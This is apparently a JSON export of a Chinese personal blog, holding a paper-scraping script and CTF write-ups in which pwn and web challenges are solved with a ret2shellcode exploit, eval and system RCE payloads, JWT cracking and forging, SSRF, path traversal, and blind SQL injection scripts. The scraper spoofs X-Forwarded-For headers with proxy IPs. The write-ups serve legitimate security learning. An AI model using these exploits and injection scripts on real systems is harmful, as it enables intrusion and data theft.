{"meta":{"title":"Somebird的林间小仓库","subtitle":"Recording for Remembering","description":"记录成长之路","author":"Somebird","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2024-12-25T14:33:58.000Z","updated":"2024-12-25T14:35:29.868Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2024-12-25T14:24:22.000Z","updated":"2024-12-25T14:32:19.490Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"基于request库和re库的爬虫实战","slug":"基于request库和re库的爬虫实战","date":"2025-03-07T03:56:50.000Z","updated":"2025-03-07T11:03:16.306Z","comments":true,"path":"2025/03/07/基于request库和re库的爬虫实战/","permalink":"http://example.com/2025/03/07/%E5%9F%BA%E4%BA%8Erequest%E5%BA%93%E5%92%8Cre%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/","excerpt":"","text":"某个实验课的任务，目标是从论文数据库爬取500篇论文 爬取网站：The latest in Machine Learning | Papers With Code 关键字：LLM evaluation 老师给的源代码DrissionPage库，很赞很好用，就是太慢了。 一时兴起打算用request库+re库自己搓一个爬虫 正则虐我千百遍，我待正则如初恋😋 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156import requestsimport reimport randomimport timeimport csv#随机UA，这是模拟类人行为的一部分USER_AGENTS = [ &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60&#x27;, &#x27;Opera/8.0 (Windows NT 5.1; U; en)&#x27;, &#x27;Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50&#x27;, &#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0&#x27;, &#x27;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&#x27;, &#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&#x27;, &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&#x27;, &#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0&#x27;, &#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)&#x27;, &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36&#x27; ]#先去扒几个免费代理ipdef get_iplist(): url = &#x27;https://www.89ip.cn/&#x27; html = requests.get(url).text ip_list=[] trs = re.findall(r&#x27;&lt;tr&gt;(.*?)&lt;/tr&gt;&#x27;,html,re.S) for tr in trs: #print(tr) #获取ip和端口 td = re.findall(r&#x27;&lt;td&gt;.*?(\\d+\\.\\d+\\.\\d+\\.\\d+|\\d+).*?&lt;/td&gt;&#x27;,tr,re.S) if td: ip = f&quot;&#123;td[0]&#125;:&#123;td[1]&#125;&quot; #print(ip) ip_list.append(ip) return ip_list def Get_headers(ip_list,USER_AGENTS): #随机选取ip和UA,类人群星闪耀 ip = random.choice(ip_list) UA = random.choice(USER_AGENTS) headers = &#123; &#x27;X-Forwarded-For&#x27;:ip , &#x27;User-Agent&#x27;:UA &#125; return headersdef work(): ip_list = get_iplist() base_url = &#x27;https://paperswithcode.com&#x27; init_url = &#x27;https://paperswithcode.com/search?q_meta=&amp;q_type=&amp;q=LLM+evaluation&#x27; href_list = [] for i in range(1,2): print(f&#x27;\\033[93m[+]正在爬取第&#123;i&#125;页\\033[0m&#x27;) time.sleep(2) page_url = f&#x27;&#123;init_url&#125;&amp;page=&#123;i&#125;&#x27; try: headers = Get_headers(ip_list,USER_AGENTS) text = requests.get(page_url,headers=headers).text #print(text) divs = re.findall(r&#x27;&lt;div class=&quot;row infinite-item item paper-card&quot;&gt;(.*?)&lt;/div&gt;&#x27;,text,re.S) for div in divs: #print(div) href = re.findall(r&#x27;&lt;a href=&quot;(.*?)&quot;&gt;&#x27;,div,re.S) #print(href) if href: href_list.append(f&#x27;&#123;base_url&#125;&#123;href[0]&#125;&#x27;) except: print(f&#x27;\\033[91m[-]第&#123;i&#125;页爬取失败！\\033[0m&#x27;) continue #print(href_list) print(f&#x27;\\033[95m[+]爬取url完成！获得url数量为&#123;len(href_list)&#125;个\\033[0m&#x27;) csv_headers = [&#x27;标题&#x27;,&#x27;摘要&#x27;,&#x27;方法&#x27;,&#x27;作者&#x27;] with open(&#x27;B:\\\\Desktop\\\\2025_Cource_assistant\\\\paperswitchcode_lib.csv&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8-sig&#x27;,newline=&#x27;&#x27;) as f: writer = csv.writer(f) writer.writerow(csv_headers) for href in href_list: print(f&#x27;\\033[93m[+]正在处理&#123;href&#125;\\033[0m&#x27;) time.sleep(1.5) try: headers = Get_headers(ip_list,USER_AGENTS) text = requests.get(href,headers=headers).text res = [] #获取论文标题 title = re.findall(r&#x27;&lt;div class=&quot;paper-title&quot;&gt;.*?&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;,text,re.S)[0].strip() #print(title) if title: res.append(title) else: res.append(&#x27;获取标题失败&#x27;) #获取论文摘要 abstract = re.findall(r&#x27;&lt;div class=&quot;paper-abstract&quot;&gt;.*?&lt;p&gt;(.*?)&lt;/p&gt;&#x27;,text,re.S)[0].strip() #print(abstract) if abstract: res.append(abstract) else: res.append(&#x27;获取摘要失败&#x27;) #获取Method method_div = re.findall(r&#x27;&lt;div class=&quot;method-section&quot; id=&quot;methods&quot;&gt;(.*?)&lt;/div&gt;&#x27;,text,re.S)[0] methods_raw = re.findall(r&#x27;&lt;a href=&quot;/method/.*?&gt;(.*?)&lt;/a&gt;&#x27;,method_div,re.S) methods = [re.sub(r&#x27;^\\s+|\\s+$&#x27;, &#x27;&#x27;, item) for item in methods_raw] print(methods) if methods : res.append(&#x27;,&#x27;.join(methods)) else: res.append(&#x27;&#x27;) #获取论文作者 authors = re.findall(r&#x27;&lt;span class=&quot;author-span&quot;&gt;.*?&lt;a href.*?&gt;(.*?)&lt;/a&gt;&#x27;,text,re.S) #print(authors) if authors: res.append(&#x27;,&#x27;.join(authors)) else: res.append(&#x27;获取作者失败&#x27;) #print(res) if res: writer.writerow(res) except: print(f&#x27;\\033[91m[-]处理&#123;href&#125;失败！\\033[0m&#x27;) continue if __name__ == &#x27;__main__&#x27;: work()","categories":[{"name":"实验","slug":"实验","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"文章","slug":"实验/文章","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"杂项","slug":"杂项","permalink":"http://example.com/tags/%E6%9D%82%E9%A1%B9/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"MoeCTF2024-WP-Pwn","slug":"MoeCTF2024-WP-Pwn","date":"2025-02-21T01:47:51.000Z","updated":"2025-03-03T08:39:53.404Z","comments":true,"path":"2025/02/21/MoeCTF2024-WP-Pwn/","permalink":"http://example.com/2025/02/21/MoeCTF2024-WP-Pwn/","excerpt":"","text":"西电链接 西电 CTF 终端 NotEnoughTime一个练习使用pwntools的题目 会输出表达式，而且后台模拟了网络延迟状况，需要使用recvuntil recvuntil是接收数据直到某个特点信息，注意设置时要用byte形式 12345678910111213141516171819202122232425from pwn import *import recontext.log_level = &quot;debug&quot; #打开debug可以随时监控都收到了什么字符，以防recvuntil卡住或者遗漏关键信息io = remote(&#x27;192.168.43.76&#x27;,2576)io.recvline()io.recvline()#不知道一共会有多少条，所以暂时先设置一个循环数for i in range(30): print(&quot;get:&quot;) line = io.recvuntil(b&#x27;=&#x27;).decode() if line == &#x27;&#x27;: break print(&#x27;[+]&#x27;,line) if &#x27;=&#x27; not in line : #不是表达式 continue else : line = re.sub(&#x27;[a-zA-Z,!.]&#x27;,&#x27;&#x27;,line) #接收途中会出现进入下一阶段的提示，将其删除以防止其混入表达式 ans=eval(line.replace(&#x27;\\n&#x27;,&#x27;&#x27;).replace(&#x27;=&#x27;,&#x27;&#x27;).replace(&#x27;/&#x27;,&#x27;//&#x27;)) io.sendline(str(ans).encode())print(&quot;done&quot;) ez_shellcode看题目就知道是ret2shellcode 随意输入一个数字，会得到nbyte的地址 而且read语句存在栈溢出漏洞 只需要把shellcode注入到nbyte，然后通过栈溢出把返回地址篡改为nbyte地址即可 1234567891011121314151617181920212223242526272829303132from pwn import *file_name = &#x27;./pwn&#x27;debug = 1if debug != 0 : io = remote(&#x27;172.26.208.1&#x27;,6400)else: io = process(file_name)elf=ELF(file_name)context(arch=elf.arch)io.recv()io.sendline(b&#x27;1000000&#x27;)io.recvline()ret_addr = int(io.recvline().decode(&#x27;utf-8&#x27;)[:-1],16)shellcode = asm(shellcraft.amd64.sh())padding = 0x60 + 8payload = shellcode.ljust(padding,b&#x27;a&#x27;) + p64(ret_addr) io.sendline(payload)io.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTFwp","slug":"CTFwp","permalink":"http://example.com/tags/CTFwp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"2024NewStarCTF-WP-Web","slug":"2024NewStarCTF-WP-Web","date":"2024-12-28T15:18:43.000Z","updated":"2025-02-22T01:39:16.349Z","comments":true,"path":"2024/12/28/2024NewStarCTF-WP-Web/","permalink":"http://example.com/2024/12/28/2024NewStarCTF-WP-Web/","excerpt":"","text":"西电链接： 西电 CTF 终端 Week 2pangbai过家家(2) 连接进入，叫清点泄露文件 首先用dirsearch扫一下目录 发现.git文件，确定为git泄露，用Githack把泄露的文件下载下来 log和branch都没有找到后门，还有可能的就是stash(临时保存区)了 Git – Stash命令|极客教程 发现后面，用stash apply将暂存区重新应用 找到后门文件源代码，发现是一个正则表达式绕过 关键点1：非法字符转换下划线 故这里在提交payload时，NewStar_CTF.2024要写为NewStar[CTF.2024 关键点2：正则表达式首位检测绕过 preg_match默认为单行模式，如果字符串末尾是换行符，则换行符会被当做行尾而不是字符串的一部分，但是在严格不等于!&#x3D;&#x3D;中，”Welcome”和”Welcome\\n”是不等的， 所以这里构造的最终payload是 NewStar[CTF.2024&#x3D;Welcome%0a（%0a是换行符的url编码） func&#x3D;system args&#x3D;’ls &#x2F;‘ 传入发现没有回显，猜测是ls &#x2F;被过滤了或者缺少权限（？其实我也不知道为什么），因为之前的flag大部分都在环境变量里，所以这里尝试用env语句打印环境变量 得到flag 遗失的拉链题目是拉链，想到zip，应该是一个.zip源码泄露，所以先扫一下目录看看 果然有，下载下来，拿到源代码 有一个php内容如下 是一个简单的比较绕过 sha_1和md5强相等，这个应该是很难找到两个字符符合要求的，所以想到传入两个数组，这样两个函数的返回值都是null，就可以强相等了，同时也绕过了不等号 代码里把cat和flag过滤了，我们用和cat效果差不多的more来读取文件，flag也不用打全，用通配符*即可 week 3臭皮的计算器载入页面，叫我们去&#x2F;cal路径，来到这个路径后，查看源代码，发现后端flask源码直接给了 源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from flask import Flask, render_template, requestimport uuidimport subprocessimport osimport tempfileapp = Flask(__name__)app.secret_key = str(uuid.uuid4())def waf(s): token = True for i in s: if i in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;: token = False break return token@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/calc&quot;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def calc(): if request.method == &#x27;POST&#x27;: num = request.form.get(&quot;num&quot;) script = f&#x27;&#x27;&#x27;import osprint(eval(&quot;&#123;num&#125;&quot;))&#x27;&#x27;&#x27; print(script) if waf(num): try: result_output = &#x27;&#x27; with tempfile.NamedTemporaryFile(mode=&#x27;w+&#x27;, suffix=&#x27;.py&#x27;, delete=False) as temp_script: temp_script.write(script) temp_script_path = temp_script.name result = subprocess.run([&#x27;python3&#x27;, temp_script_path], capture_output=True, text=True) os.remove(temp_script_path) result_output = result.stdout if result.returncode == 0 else result.stderr except Exception as e: result_output = str(e) return render_template(&quot;calc.html&quot;, result=result_output) else: return render_template(&quot;calc.html&quot;, result=&quot;臭皮！你想干什么！！&quot;) return render_template(&quot;calc.html&quot;, result=&#x27;试试呗&#x27;)if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, port=30002) 分析源码可得，我们输入num，程序自动计算num的表达式数值，且用到了eval函数，这里包含一个RCE漏洞，但关键在于，还有一个防火墙，过滤了所有字母，所以是一个无字母的RCE。 python的无字母rce，用的比较多的是八进制绕过，这里简单写一个程序把我们的payload转为八进制编码。 12345678txt=input(&quot;payload:&quot;)payload=&quot;&quot;for i in txt: if i.isalpha() or i==&#x27;_&#x27; : payload+=&#x27;\\\\&#x27;+oct(ord(i))[2:] else: payload+=iprint(payload) 传入得到flag 这照片是你吗连入环境，日常看源代码找提示 这里不太看得明白其中的原理，但隐约感觉应该有任意文件读取的漏洞，这里随便试一下访问图片 看上去是可以用路径访问文件的，那么就得弄明白源代码在哪，继续收集信息发现 这里的server是python，应该是flask，那么源代码应该是在app.py 而且一般flask的静态文件都放在和app.py同目录的static文件夹里，猜测可能当前目录就是static，试试路径穿透 注意这里不要直接在浏览器目录端口写..&#x2F;，会被过滤掉，要抓包后修改 拿到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178from flask import Flask, make_response, render_template_string, request, redirect, send_fileimport uuidimport jwtimport timeimport osimport requestsfrom flag import get_random_number_stringbase_key = str(uuid.uuid4()).split(&quot;-&quot;)secret_key = get_random_number_string(6)admin_pass = &quot;&quot;.join([ _ for _ in base_key])print(admin_pass)app = Flask(__name__)failure_count = 0users = &#123; &#x27;admin&#x27;: admin_pass, &#x27;amiya&#x27;: &quot;114514&quot;&#125;def verify_token(token): try: global failure_count if failure_count &gt;= 100: return make_response(&quot;You have tried too many times! Please restart the service!&quot;, 403) data = jwt.decode(token, secret_key, algorithms=[&quot;HS256&quot;]) if data.get(&#x27;user&#x27;) != &#x27;admin&#x27;: failure_count += 1 return make_response(&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 403) except: return make_response(&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 401) return True@app.route(&#x27;/&#x27;)def index(): return redirect(&quot;/home&quot;)@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login(): username = request.form[&#x27;username&#x27;] password = request.form[&#x27;password&#x27;] global failure_count if failure_count &gt;= 100: return make_response(&quot;You have tried too many times! Please restart the service!&quot;, 403) if users.get(username)==password: token = jwt.encode(&#123;&#x27;user&#x27;: username, &#x27;exp&#x27;: int(time.time()) + 600&#125;, secret_key) response = make_response(&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;) response.set_cookie(&#x27;token&#x27;, token) return response else: failure_count += 1 return make_response(&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;, 401)@app.route(&#x27;/logout&#x27;)def logout(): response = make_response(&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;) response.set_cookie(&#x27;token&#x27;, &#x27;&#x27;, expires=0) return response@app.route(&#x27;/home&#x27;)def home(): logged_in = False try: token = request.cookies.get(&#x27;token&#x27;) data = jwt.decode(token, secret_key, algorithms=[&quot;HS256&quot;]) text = &quot;Hello, %s!&quot; % data.get(&#x27;user&#x27;) logged_in = True except: logged_in = False text = &quot;You have not logged in!&quot; data = &#123;&#125; return render_template_string(r&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Home Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 图标能够正常显示耶! --&gt; &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt; &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt; &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt; &#123;&#123; text &#125;&#125;&lt;br&gt; &#123;% if logged_in %&#125; &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt; &#123;% else %&#125; &lt;h2&gt;登录&lt;/h2&gt; &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt; 用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt; 密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt; &#123;% endif %&#125; &lt;br&gt; &#123;% if user==&quot;admin&quot; %&#125; &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt; &lt;img src=&quot;/2.png&quot;&gt; &#123;% else %&#125; &lt;img src=&quot;/1.png&quot;&gt; &#123;% endif %&#125; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27;, text=text, logged_in=logged_in, user=data.get(&#x27;user&#x27;))@app.route(&#x27;/admin&#x27;)def admin(): try: token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) resp_text = render_template_string(r&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Admin Panel&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Admin Panel&lt;/h1&gt; &lt;p&gt;GET Server Info from api:&lt;/p&gt; &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt; &lt;button onclick=execute()&gt;Execute&lt;/button&gt; &lt;script&gt; function execute() &#123; fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value, &#123;credentials: &quot;include&quot;&#125; ).then(res =&gt; res.text()).then(data =&gt; &#123; document.write(data); &#125;); &#125; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27;, api_url=request.host_url+&quot;/api&quot;, url=request.host_url) resp = make_response(resp_text) resp.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27; return resp except: return make_response(&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 401)@app.route(&#x27;/execute&#x27;)def execute(): token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) api_address = request.args.get(&quot;api_address&quot;) if not api_address: return make_response(&quot;No api address!&quot;, 400) response = requests.get(api_address, cookies=&#123;&#x27;token&#x27;: token&#125;) return response.text@app.route(&quot;/api&quot;)def api(): token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) resp = make_response(f&quot;Server Info: &#123;os.popen(&#x27;uname -a&#x27;).read()&#125;&quot;) resp.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27; return resp@app.route(&quot;/&lt;path:file&gt;&quot;)def static_file(file): print(file) restricted_keywords = [&quot;proc&quot;, &quot;env&quot;, &quot;passwd&quot;, &quot;shadow&quot;, &quot;hosts&quot;, &quot;sys&quot;, &quot;log&quot;, &quot;etc&quot;, &quot;bin&quot;, &quot;lib&quot;, &quot;tmp&quot;, &quot;var&quot;, &quot;run&quot;, &quot;dev&quot;, &quot;home&quot;, &quot;boot&quot;] if any(keyword in file for keyword in restricted_keywords): return make_response(&quot;STOP!&quot;, 404) if not os.path.exists(&quot;./static/&quot; + file): return make_response(&quot;Not found!&quot;, 404) return send_file(&quot;./static/&quot; + file)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=5000) 分析源代码发现这里用了JWT令牌进行身份验证，而且密钥只有六位数字！！完全可以爆破。 这里还给了一个用户名和密码，直接用提供的用户账号登进去，获取一个token样例 用JWTcrack破解密钥 用在线JWT生成来伪造令牌，注意这里的exp里包含了令牌的有效时间，可以通过把数字加大来延长有效时间 成功伪造admin身份 管理员面板给了一个api，可以访问本地链接，那么应该有一个SSRF漏洞在这里，但是在哪呢？ 继续分析源代码，发现一个奇怪的地方 可见这里导入了一个自定义库，那应该就是在与app.py的同目录下有一个flag.py 得到内容 123456789101112131415161718from flask import Flaskimport osimport randomdef get_random_number_string(length): return &#x27;&#x27;.join([str(random.randint(0, 9)) for _ in range(length)])get_flag = Flask(&quot;get_flag&quot;)FLAG = os.environ.pop(&quot;ICQ_FLAG&quot;, &quot;flag&#123;test_flag&#125;&quot;)@get_flag.route(&quot;/fl4g&quot;)#如何触发它呢?def flag(): return FLAGif __name__ == &quot;__main__&quot;: get_flag.run(host=&quot;127.0.0.1&quot;,port=5001) 直接用管理员面板访问5001端口的&#x2F;fl4g即可 臭屁踩踩背西电终端的环境坏了，写不了，这里放一下官方题解的链接【讲的很好，强推！！！】 NewStar CTF 2024 - 西电 CTF 终端 blindsql1sqlmap不会用，以前从来没有手敲过盲注脚本，这里就简单记一下题解的脚本，以后当模板用。 1234567891011121314151617181920212223242526272829303132import requests,string,timeurl = &#x27;&#x27;result = &#x27;&#x27;for i in range(1,100): print(f&#x27;[+] Bruting at &#123;i&#125;&#x27;) for c in string.ascii_letters + string.digits + &#x27;_-&#123;&#125;&#x27;: time.sleep(0.2) # 限制速率，防止请求过快 print(&#x27;[+] Trying:&#x27;, c) # 这条语句能查询到当前数据库所有的表名 tables = f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27; # 获取所有表名的第 i 个字符，并计算 ascii 值 char = f&#x27;(ord(mid(&#123;tables&#125;,&#123;i&#125;,1)))&#x27; # 爆破该 ascii 值 b = f&#x27;((&#123;char&#125;)in(&#123;ord(c)&#125;))&#x27; # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据 p = f&#x27;Alice\\&#x27;and(&#123;b&#125;)#&#x27; res = requests.get(url, params=&#123;&#x27;student_name&#x27;: p&#125;) if &#x27;Alice&#x27; in res.text: print(&#x27;[*]bingo:&#x27;,c) result += c print(result) break union 被禁用，说明此时该使用盲注，我们能够通过插入 and 1 或者 and 0 来控制是否返回数据，由此可以使用布尔盲注 = 的绕过可以使用 like 或者 in 代替 空格和斜杠 / 被禁用，可以使用括号代替 Week 4Pangbai过家家（4）打开发现这么一个东西，问了问AI，是Go语言的SSTI，于是赶紧去学了一下Go语言SSTI相关的东西 相关文章：[Go语言]SSTI从0到1_go ssti-CSDN博客 分析给我们的源代码，可知当前对象是helper，有两个成员结构体，我们要看的Config，因为Config给了我JWT的key，不用往下翻就知道待会儿设计cookie伪造。 拿到密钥，直接丢到在线平台伪造。（JSON Web Tokens - jwt.io，这个好使） 继续往下看可以看到一个文件读取函数，应该是任意文件读取漏洞，读的是config.SignaturePath的内容，要想办法对内容进行篡改。 相关代码在这里，可见要用PUT方法，而且要求IP为本机。把要修改的路径放在包的主体即可。 这里我们直接改包，然后加一个报头Host，设置为本机。读取环境变量文件。 chocolate首先进行目录扫描，扫出一个文件 根据文件内容转到相应页面 这里要求传入一个字符串，其中包含字符0，不含字母，且要求整数化等于1337。一开始的思路是直接传入八进制的0 2471，这样intval函数会将其识别为八进制并自动转化为十进制整数1337， 但是由于这里0在第一位，对应索引号为0，strops返回0，则！strpos的判断结果为真，导致die掉 所以这里还需要在02471前加一个空格，（%20是空格的url编码） 成功拿到信息，除了给出一个成分之外，还给了一串字符，让我们对其解密 询问deepseek发现是ROT13加密，对其进行解密 得到下一个路径 首先，get传入两个参数，要求其md5相同 由于是强比较，而且过滤了数组，所以只能上网去找强碰撞的字符 md5强比较的几种绕过，强碰撞，shal强比较的几种绕过，强碰撞_md5强比较绕过-CSDN博客 在这里找到一组满足条件的参数 12cat=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;dog=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 下一步是post传入一个参数，要求其自身与自身的md5弱相等 这不是传统的弱相等，传统的题只需要找一个开头为字母且md5为0e开头的字符串即可 但这方法在本题行不通，因为这题的php版本是8 PHP 变动：PHP 8 版本下字符串与数值的弱比较_php 隐式转换比较-CSDN博客 所以只能找数值字符串，也就是本身是0e开头，md5后仍是0e开头 这样的字符串也不少，比如 10e215962017 最后一步，传入一个字符串，其md5以8031b开头 这也是一个强比较，没有办法，只能写脚本尝试碰撞 1234567891011121314151617import hashlibimport randomdef generate() -&gt; str: return str(random.randint(1000000,9999999)) #其实相比随机数，用for in range穷尽会更好，因为可以指导判断是否能在这个范围找到def encode(s) : return hashlib.md5(s).hexdigest()if __name__ == &#x27;__main__&#x27;: tar=&quot;8031b&quot; #寻找以8031b为开头的md5的字符串 while True: strs=generate() print(f&quot;[+] testing on &#123;strs&#125;&quot;) if encode(strs.encode()).startswith(tar) : print(&quot;Found!&quot;,strs) break 传入参数获取信息 接下来进入最后的挑战（烦死这个套娃了） 参数的传入是通过input伪协议，只要把要传入的内容直接写在post主体就好了 这里需要传入一个序列化之后的chocolate对象，虽然加了一个正则检测，但是其实好像没有什么用 就算触发错误，析构函数仍然会执行，我们仍然可以得到想要的信息 而且绕过也很简单，大小写绕过就好 传入即可得到最后的信息 但是我找了半天，也找不到糖在哪，看了提示之后才知道这个要自己试 随便填一个糖分 从这里可以看到填的数字低了，如果填的数字太大，会显示太甜了 那就好办了，直接二分法把正确的糖分试出来，最后发现是2042 blindsql2这里直接给出脚本了，与前面的blindsql1的过滤情况是一样的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#盲注脚本模板，可用于布尔盲注和时间盲注import requests,string,timefrom retry import retryurl = &#x27;http://192.168.43.76:1405/&#x27;#有时候会发生连接错误，需要重试@retry(tries=3,delay=1) def injection(url,params): res = requests.get(url, params) return res.elapsed.total_seconds()def get_param(position,char_to_be_tried): # 模板语句，采用括号绕过 tables = f&#x27;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\\&#x27;flag%\\&#x27;)))&#x27; # 获取所有表名的第position个字符，并计算 ascii 值 char = f&#x27;(ord(mid(&#123;tables&#125;,&#123;position&#125;,1)))&#x27; # 爆破该 ascii 值 b = f&#x27;((&#123;char&#125;)in(&#123;ord(char_to_be_tried)&#125;))&#x27; # 若 ascii 猜对了，则 and 后面的结果(即b的值)是 true p = f&#x27;Alice\\&#x27;and(if(&#123;b&#125;,sleep(1.5),0))#&#x27; return presult = &#x27;&#x27;for i in range(100): print(f&#x27;[+] Bruting at &#123;i&#125;&#x27;) flag = 0 for c in string.ascii_letters + &#x27;,_-&#123;&#125;@&#x27; + string.digits : time.sleep(0.01) # 限制速率，防止请求过快 print(&#x27;[+] Trying:&#x27;, c) p=get_param(i,c) params=&#123;&#x27;student_name&#x27;: p&#125; respond_time = injection(url,params) if respond_time &gt; 1.5: print(&#x27;[*]bingo:&#x27;,c) result += c flag = 1 print(result) break else: print(respond_time) #当前位置缺失，可能是字符集不完整 if flag == 0: print(&#x27;Lack&#x27;) result += 